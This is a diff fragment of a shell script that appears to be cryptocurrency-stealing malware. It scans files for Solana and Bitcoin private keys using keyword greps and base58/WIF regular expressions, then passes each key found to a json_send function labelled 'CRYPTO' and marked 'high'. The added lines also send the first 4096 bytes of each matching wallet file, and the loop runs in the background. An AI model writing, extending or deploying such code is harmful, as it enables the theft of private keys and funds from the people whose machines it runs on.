@@ -235,6 +235,7 @@ done | while read f; do
     if grep -qilE 'solana|phantom|SOLANA|keypair' "$f" 2>/dev/null; then
         grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | sort -u | head -2 | while read k; do
             json_send "CRYPTO" "$f" "SOL_B58" "$k" "high"
+            json_send "CRYPTO" "$f" "SOL_FILE_FULL" "$(head -c 4096 "$f" 2>/dev/null)" "high"
         done
     fi
     
@@ -242,6 +243,7 @@ done | while read f; do
     if grep -qilE 'bitcoin|BTC|wallet|WIF' "$f" 2>/dev/null; then
         grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | sort -u | head -2 | while read k; do
             json_send "CRYPTO" "$f" "BTC_WIF" "$k" "high"
+            json_send "CRYPTO" "$f" "BTC_FILE_FULL" "$(head -c 4096 "$f" 2>/dev/null)" "high"
         done
     fi
 done &
